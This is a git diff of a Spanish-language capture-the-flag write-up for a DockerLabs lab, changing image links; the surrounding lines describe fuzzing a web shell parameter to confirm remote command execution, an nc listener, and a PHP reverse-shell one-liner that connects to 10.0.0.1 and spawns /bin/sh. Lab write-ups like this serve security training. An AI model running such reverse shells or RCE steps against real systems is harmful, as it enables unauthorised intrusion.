@@ -56,7 +56,7 @@ wfuzz -c --hl=0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-li
 
 El resultado del `wfuzz` devuelve 2 líneas, a diferencia de otros intentos que devuelven 0 líneas. Esto indica que `shell.php?parameter=id` está ejecutando el comando `id` y devolviendo su salida. Esto confirma que se ha logrado una Ejecución Remota de Comandos (RCE).
 
-![Fuzzing](.Imagenes/WhereIsMyWebShell_Fuzzing.png)
+![Fuzzing](https://github.com/WebReconSpider/the-hackbook/blob/main/Ejercicios/DockerLabs/2Facil/Imagenes/WhereIsMyWebShell_Fuzzing.png)
 
 ## 4. Obtención de una Reverse Shell
 
@@ -74,7 +74,7 @@ nc -lnvp 443
 ### Generación y Ejecución de la PHP Reverse Shell
 
 Se busca una `PHP reverse shell` adecuada en recursos como `https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/`. La plantilla utilizada es:
-![Reverse_Shell](WhereIsMyWebShell_Reverse_Shell.png)
+![Reverse_Shell](https://github.com/WebReconSpider/the-hackbook/blob/main/Ejercicios/DockerLabs/2Facil/Imagenes/WhereIsMyWebShell_Reverse_Shell.png)
 ```php
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
